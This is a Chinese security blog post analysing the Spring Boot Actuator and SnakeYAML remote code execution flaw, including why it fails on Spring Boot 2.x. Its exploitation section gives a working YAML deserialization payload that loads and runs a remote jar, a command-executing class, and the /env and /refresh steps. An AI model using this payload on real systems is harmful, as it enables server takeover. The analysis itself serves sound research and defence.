# SpringBoot-Actuator-SnakeYAML-RCE漏洞深度分析

阅读量 **234636**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-08 15:30:33

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01ef5870450b88d554.png)

## 前言

近期搬砖过程中又遇到actuator组件开放的情况，且env端点发现存在SnakeYAML依赖，为判断能否通过此问题进一步深入到内部，尝试借用SnakeYAML依赖获取服务端权限，失败了……

为确认失败原因，特对actuator+SnakeYAML rce问题进行了深入分析，下面为过程记录。

## SnakeYAML使用

是Java用于解析yaml格式数据的类库, 它提供了dump()将java对象转为yaml格式字符串，load()将yaml字符串转为java对象；

创建一个User类：

    
    
    public class User {
        String name;
        Integer age;
    
        public String getName() {
            return name;
        }
    
        public void setName(String name) {
            this.name = name;
        }
    
        public Integer getAge() {
            return age;
        }
    
        public void setAge(Integer age) {
            this.age = age;
        }
    
        @Override
        public String toString() {
            return "User{" +
                    "name='" + name + '\'' +
                    ", age=" + age +
                    '}';
        }
    }
    

snakeyaml序列化、反序列化测试：

    
    
    public class SnakeYamlTest {
        public static void main(String[] args) {
            // 序列化测试
            User user = new User();
            user.setName("test");
            user.setAge(20);
            Yaml yaml1 = new Yaml();
            String dump1 = yaml1.dump(user);
            System.out.println("snakeyaml序列化测试：");
            System.out.println(dump1);
    
            //反序列化测试
            String dump2 = "!!com.ttestoo.snakeyaml.demo.User {age: 30, name: admin}";
            Yaml yaml2 = new Yaml();
            Object load = yaml2.load(dump2);
            System.out.println("snakeyaml反序列化测试：");
            System.out.println(load.getClass());
            System.out.println(load);
        }
    }
    

运行结果：

![](https://p3.ssl.qhimg.com/t0111a7e8040ee6b9e0.png)

## Actuator env说明

1、actuator组件的/env端点是否支持POST请求？

这个问题困扰了挺久，google搜了很多最终还是回到了官方文档，结论如下：

springboot的/env本身是只读的，是否能post是springcloud的扩展！！！项目作者在GitHub回复如下：

<https://github.com/spring-projects/spring-boot/issues/20509>

![](https://p4.ssl.qhimg.com/t013fb3e1b97d98b571.png)

而且翻了springboot多个1.x和2.x的官方文档，均未提及env端点能post请求改变环境变量：

官方文档地址如下，改版本号即可：

<https://docs.spring.io/spring-boot/docs/1.4.7.RELEASE/reference/htmlsingle/#production-ready-endpoints>

所有版本文档：<https://docs.spring.io/spring-boot/docs/>

2.2.5版本 actuator api文档如下：

文档中仅说明可GET请求，并未提及可POST请求！！！

<https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/actuator-api//html/#env>

![](https://p5.ssl.qhimg.com/t0138d4aa6097de3273.png)

根据github上springboot作者提示，继续翻springcloud官方文档，证明在springcloud的spring-cloud-context模块中对env进行了扩展，支持post请求：

[https://cloud.spring.io/spring-cloud-static/spring-cloud-commons/2.1.3.RELEASE/single/spring-cloud-commons.html#_endpoints（这里以2.1.3版本为例）](https://cloud.spring.io/spring-cloud-static/spring-cloud-commons/2.1.3.RELEASE/single/spring-cloud-commons.html#_endpoints%EF%BC%88%E8%BF%99%E9%87%8C%E4%BB%A52.1.3%E7%89%88%E6%9C%AC%E4%B8%BA%E4%BE%8B%EF%BC%89)

![](https://p3.ssl.qhimg.com/t01c2f461d9cbc4d08a.png)

2、那么实际利用过程中为啥有时post请求报错405呢？

继续查询springcloud项目文档，spring cloud所有版本文档：[https://docs.spring.io/spring-cloud/docs/；](https://docs.spring.io/spring-cloud/docs/%EF%BC%9B)

发现在Spring Cloud Hoxton Service Release 3
(SR3)的更新公告中，env端点默认不可写即post请求，可通过management.endpoint.env.post.enabled=true配置开启env端点的post请求：

<https://spring.io/blog/2020/03/05/spring-cloud-hoxton-service-release-3-sr3-is-available>

![](https://p4.ssl.qhimg.com/t014f690a7c82d16cbc.png)

继续查看Spring Cloud Hoxton Service Release 3 (SR3)的更新公告，可得知Hoxton.SR3基于Spring
Boot 2.2.5.RELEASE构建：

![](https://p4.ssl.qhimg.com/t014f0fc4fb5efad9f2.png)

在最下方可看到Hoxton.SR3版本对应的Spring Cloud Config组件版本为2.2.2.RELEASE：

![](https://p1.ssl.qhimg.com/t01536cdd8ff2f35523.png)

那么为什么Spring Cloud Config组件和Spring Cloud context模块又有什么关系呢？查看spring-cloud-config
2.2.2.RELEASE代码，其中pom.xml中包含spring-cloud-context 2.2.2.RELEASE依赖：

![](https://p0.ssl.qhimg.com/t01364a88ccd548fbbe.png)

也就是说项目中引入了spring-cloud-starter-config 2.2.2.RELEASE也就包含了 spring-cloud-context
2.2.2.RELEASE， **这就是为什么针对actuator rce利用环境中引入spring-cloud-starter-config组件或者指定spring-cloud-dependencies版本为Hoxton.SR1的原因！！！**

且这里已对spring-cloud-starter-config 2.2.1.RELEASE版本进行验证，Hoxton.SR3版本对应的spring-cloud-context也为2.2.2.RELEASE；

总结，在spring cloud Hoxton.SR3开始（基于Spring Boot 2.2.5.RELEASE构建，其中spring-cloud-context或者spring-cloud-starter-config为2.2.2.RELEASE版本），需要配置management.endpoint.env.post.enabled=true才可post访问env端点。

实际验证：

(1) 当引入spring-cloud-starter-config或spring-cloud-context 2.2.1.RELEASE时:

    
    
    <dependency>
        <groupId>org.springframework.cloud</groupId>
        <artifactId>spring-cloud-starter-config</artifactId>
        <version>2.2.1.RELEASE</version>
    </dependency>
    
    或
    <dependency>
        <groupId>org.springframework.cloud</groupId>
        <artifactId>spring-cloud-context</artifactId>
        <version>2.2.1.RELEASE</version>
    </dependency>
    

不用手工单独配置management.endpoint.env.post.enabled=true即可进行post请求：

![](https://p4.ssl.qhimg.com/t017fc8de027cbf4e45.png)

(2) 当引入spring-cloud-starter-config或spring-cloud-context 2.2.2.RELEASE时：

    
    
    <dependency>
        <groupId>org.springframework.cloud</groupId>
        <artifactId>spring-cloud-starter-config</artifactId>
        <version>2.2.2.RELEASE</version>
    </dependency>
    
    或
    <dependency>
        <groupId>org.springframework.cloud</groupId>
        <artifactId>spring-cloud-context</artifactId>
        <version>2.2.2.RELEASE</version>
    </dependency>
    

若未配置management.endpoint.env.post.enabled=true，则不支持post请求：

![](https://p4.ssl.qhimg.com/t01fa643be1db449619.png)

![](https://p0.ssl.qhimg.com/t01b320db024cdcc8e4.png)

当配置management.endpoint.env.post.enabled=true后，可支持post请求：

![](https://p2.ssl.qhimg.com/t018876fe9c0403ffe2.png)

![](https://p3.ssl.qhimg.com/t01db2e0c3533996280.png)

## 漏洞利用

###  部分条件

SpringBoot 1.x（spring-cloud-context copyEnvironment函数未更新前）

Actuator未授权且需springcloud扩展env endpoints post请求

org.yaml.snakeyaml组件

###  漏洞环境

<https://github.com/ttestoo/springboot-actuator-snakeyaml-rce>

###  利用过程

1、vps起个http服务，上面放yml配置文件yaml-payload.yml和yaml-payload.jar文件：

![](https://p5.ssl.qhimg.com/t01186b2958f76aecc5.png)

yaml-payload.yml内容如下：

    
    
    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://127.0.0.1:8087/yaml-payload.jar"]
      ]]
    ]
    

yaml-payload.jar参考：[https://github.com/artsploit/yaml-payload，主要内容在构造方法中：](https://github.com/artsploit/yaml-payload%EF%BC%8C%E4%B8%BB%E8%A6%81%E5%86%85%E5%AE%B9%E5%9C%A8%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E4%B8%AD%EF%BC%9A)

    
    
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    

2、利用actuator的/env
endpoint修改spring.cloud.bootstrap.location属性的值为vps上的yml配置文件的地址[http://127.0.0.1:8087/yaml-payload.yaml：](http://127.0.0.1:8087/yaml-payload.yaml%EF%BC%9A)

![](https://p3.ssl.qhimg.com/t01560f33651c9b31c2.png)

通过actuator的/refresh接口刷新配置，则成功执行payload：

![](https://p5.ssl.qhimg.com/t01b23e2f7b067f57de.png)

## 漏洞分析

springboot actuator组件未授权访问时，其/env端点经过spring
cloud的扩展，可通过post请求设置env属性值，/refresh端点可以刷新配置；

当设置spring.cloud.bootstrap.location的值为外部的yaml文件地址时，通过refresh端点刷新时将会访问yaml文件地址并读取yaml文件内容：

  * http请求/refresh接口，将进入到刷新配置的入口 org.springframework.cloud.endpoint.RefreshEndpoint#refresh：

![](https://p3.ssl.qhimg.com/t013a19aac9a0dbd60b.png)

  * 其中spring.cloud.bootstrap.location的值 将在org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中
  * 进行处理：

![](https://p1.ssl.qhimg.com/t01bf7ea4b4f8030c03.png)

  * 由于获取到spring.cloud.bootstrap.location的值为yaml后缀，将在org.springframework.boot.env.PropertySourcesLoader#load中调用到org.springframework.boot.env.YamlPropertySourceLoader#load进行加载yaml文件：

![](https://p4.ssl.qhimg.com/t01f79204a25b86930e.png)

![](https://p5.ssl.qhimg.com/t01137c82faf8e48a05.png)

  * 最终在org.yaml.snakeyaml.Yaml#loadAll中进行读取yaml文件内容：

![](https://p0.ssl.qhimg.com/t013492ef3b6d57c988.png)

通过org.yaml.snakeyaml.Yaml#loadAll读取yaml文件内容，简单总结如下：

    
    
    Yaml yaml = new Yaml();
    Object url = yaml.load("!!javax.script.ScriptEngineManager [\n" +
            "  !!java.net.URLClassLoader [[\n" +
            "    !!java.net.URL [\"http://127.0.0.1:8087/yaml-payload.jar\"]\n" +
            "  ]]\n" +
            "]");
    

由于SnakeYAML支持!!+完整类名的方式指定要反序列化的类，并可以[arg1, arg2, ……]
的方式传递构造方法所需参数，则上述操作等价于执行如下内容：

    
    
    URL url = new URL("http://127.0.0.1:8087/yaml-payload.jar");
    URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
    new ScriptEngineManager(urlClassLoader);
    

而URLClassLoader继承自SecureClassLoader（继承自ClassLoader），支持从jar包、文件系统目录和远程http服务器中动态获取class文件以加载类（ClassLoader只能加载classpath下面的类）；

这里则将访问<http://127.0.0.1:8087/yaml-payload.jar>
，并通过javax.script.ScriptEngineManager#ScriptEngineManager进行处理：

![](https://p4.ssl.qhimg.com/t01d5e760e88a09a757.png)

下面就是ScriptEngineManager利用链的分析过程；

首先init()中调用initEngines()，使用SPI机制动态加载javax.script.ScriptEngineFactory的实现类，即通过getServiceLoader，去寻找yaml-payload.jar中META-INF/services目录下的名为javax.script.ScriptEngineFactory的文件，获取该文件内容并加载其中指定的类；

![](https://p5.ssl.qhimg.com/t01451185c4f69acc2c.png)

为了满足Java SPI机制（是JDK内置的一种服务提供发现机制）的约定，在yaml-payload.jar中的恶意类实现了ScriptEngineFactory，META-INF/services/目录下存在一个名为javax.script.ScriptEngineFactory，文件内容为完整恶意类名：

![](https://p5.ssl.qhimg.com/t01d5ec9d8a679db2c6.png)

Java SPI机制可参考：<https://docs.oracle.com/javase/tutorial/sound/SPI-intro.html>

继续跟进，经过如下调用链：

![](https://p2.ssl.qhimg.com/t01c680cb7a9519b047.png)

最终在java.util.ServiceLoader.LazyIterator#nextService中利用Java反射机制获取yaml-payload.jar中的恶意类，并在newInstance时触发恶意类构造函数中的payload：

![](https://p1.ssl.qhimg.com/t018b217a0ffffe0185.png)

![](https://p1.ssl.qhimg.com/t01a58f8b948afc7b37.png)

注意，这里forName的第二个参数initialize为false，有些博客描述为当true时则可触发恶意类构造函数中的payload；

其实，当forName第二个参数为true时仅会进行类初始化，从注释中也可看到：

![](https://p4.ssl.qhimg.com/t01143a704d9c5c239c.png)

而类的初始化并不会执行构造函数，但是会执行静态代码块，验证如下：

    
    
    public class TestClassForname {
    
        public static void main(String[] args) throws ClassNotFoundException {
            ClassLoader loader = TestClassForname.class.getClassLoader();
    
            System.out.println("\n=========initialize为false测试==========");
            Class.forName("com.ttestoo.snakeyaml.payload.Test", false, loader);
    
            System.out.println("\n=========initialize为true测试==========");
            Class.forName("com.ttestoo.snakeyaml.payload.Test", true, loader);
        }
    }
    
    class Test {
        static {
            System.out.print("静态代码块被调用。。。");
        }
    
        public Test() {
            System.out.print("无参构造函数被调用。。。");
        }
    }
    

![](https://p3.ssl.qhimg.com/t01e56bec5eb0fe51a6.png)

当然，恶意类中的payload也可以放在静态代码块中，由于这里为false依旧在newInstance()时触发：

    
    
    public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    
        static  {
            try {
                Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        ....
    

## SpringBoot 2.x利用的问题

上述分析过程在springboot 1.x环境下，8月16号刚好遇到实际业务环境springboot
2.x存在actuator未授权访问问题，且存在snakeyaml组件：

![](https://p5.ssl.qhimg.com/t01971d7aa95270286a.png)

利用过程中env endpoints post请求正常：

![](https://p1.ssl.qhimg.com/t01d13235382ce38377.png)

但是请求refresh后并无任何动静，且响应内容为空（1.x请求refresh端点会响应“document”）：

![](https://p2.ssl.qhimg.com/t017407f0ee44a03605.png)

这就是知识点未学透的结果！！！对于此利用方式，2.x能否成功rce呢？

搭建2.x的测试环境（和业务环境一致），如下：

    
    
    springboot 2.0.6.RELEASE
    springcloud 2.0.0.RELEASE
    org.yaml.snakeyaml 1.19
    
    注意2.x需手工配置开启env、refresh endpoints，这里为方便直接*：
    management.endpoints.web.exposure.include=*
    

在1.x利用分析过程中得知spring.cloud.bootstrap.location属性是在org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中获取，这里直接在此处下断点：

![](https://p2.ssl.qhimg.com/t01ba7a550206c569f3.png)

开启debug，记得在请求refresh前通过env设置spring.cloud.bootstrap.location属性（否则可能为空，影响判断）：

![](https://p3.ssl.qhimg.com/t010e0bc239c0831dd8.png)

接下来请求refresh端点，可清晰看到此时configLocation为空，即并未获取到上步设置的spring.cloud.bootstrap.location属性：

![](https://p4.ssl.qhimg.com/t013593276f90232537.png)

此时environment参数中无任何spring.cloud.bootstrap.location属性相关的信息：

![](https://p5.ssl.qhimg.com/t01d9ad8deb486d22f8.png)

回看1.x环境中的environment，发现在propertySources的propertySourceList中包含一个name为manager，value为env
post请求设置的属性值：

![](https://p1.ssl.qhimg.com/t011daf49d9f57136a1.png)

可初步判断是在设置spring.cloud.bootstrap.location属性时出现了变更导致environment变量中无spring.cloud.bootstrap.location属性造成无法rce；

那么接下来就可以溯源environment变量如何生成的；根据执行到String configLocation =
environment.resolvePlaceholders(“${spring.cloud.bootstrap.location:}”);的调用链，可得知environment在org.springframework.cloud.context.refresh.ContextRefresher#refresh中定义并通过org.springframework.cloud.context.refresh.ContextRefresher#copyEnvironment函数进行赋值：

![](https://p0.ssl.qhimg.com/t015d100520a5fec432.png)

![](https://p4.ssl.qhimg.com/t015c80ae48fc8c8c5c.png)

对比spring-cloud-context 1.2.0和spring-cloud-context
2.0.0的copyEnvironment函数，其中1.x中将input（来自this.context.getEnvironment()，包含post
env设置的spring.cloud.bootstrap.location属性）中propertySources的propertySourceList全部赋值给environment：

![](https://p1.ssl.qhimg.com/t01591211a3d3afcf92.png)

而在2.x中增加了一个for循环进行判断name是否在常量DEFAULT_PROPERTY_SOURCES中，只有在其中的才会执行capturedPropertySources.addLast操作：

![](https://p3.ssl.qhimg.com/t01518fbeba832b8e87.png)

跟进常量DEFAULT_PROPERTY_SOURCES，为String数组：[“commandLineArgs”,
“defaultProperties”]

![](https://p2.ssl.qhimg.com/t011373e4671a02ed9e.png)

![](https://p0.ssl.qhimg.com/t01ffc1fd2acb721469.png)

由于我们通过post
env端点设置的spring.cloud.bootstrap.location属性值存放在name为manager中，所以这里并不会执行capturedPropertySources.addLast操作，也就无法添加到environment中，从而导致spring.cloud.bootstrap.location属性值在refresh时并未设置并刷新：

![](https://p3.ssl.qhimg.com/t01df874288a4cf0d7e.png)

即上面所说的现象，org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中获取spring.cloud.bootstrap.location属性值时为空：

![](https://p4.ssl.qhimg.com/t01db62a457c7d4a225.png)

> 注意，这里补充下，根据“Actuator env说明”部分可知，refresh是在spring-cloud-> context中扩展的，所以此问题重点是spring-cloud-> context的变更导致，即上方org.springframework.cloud.context.refresh.ContextRefresher#copyEnvironment函数的不同。

## 巨人的肩膀

  * [exploiting-spring-boot-actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
  * [yaml-payload](https://github.com/artsploit/yaml-payload)
  * [exploit-spring-boot-actuator-spring-cloud-env-note](https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note)
  * ……

最后，认知有限，烦请大佬指点。。。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ttestoo** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254629](/post/id/254629)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [SpringBoot](/tag/SpringBoot)
  * [actuator](/tag/actuator)
  * [snakeyaml](/tag/snakeyaml)

 **+1** __2赞

 __收藏

![](https://p4.ssl.qhimg.com/t019adae1145cd57009.png) ttestoo

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

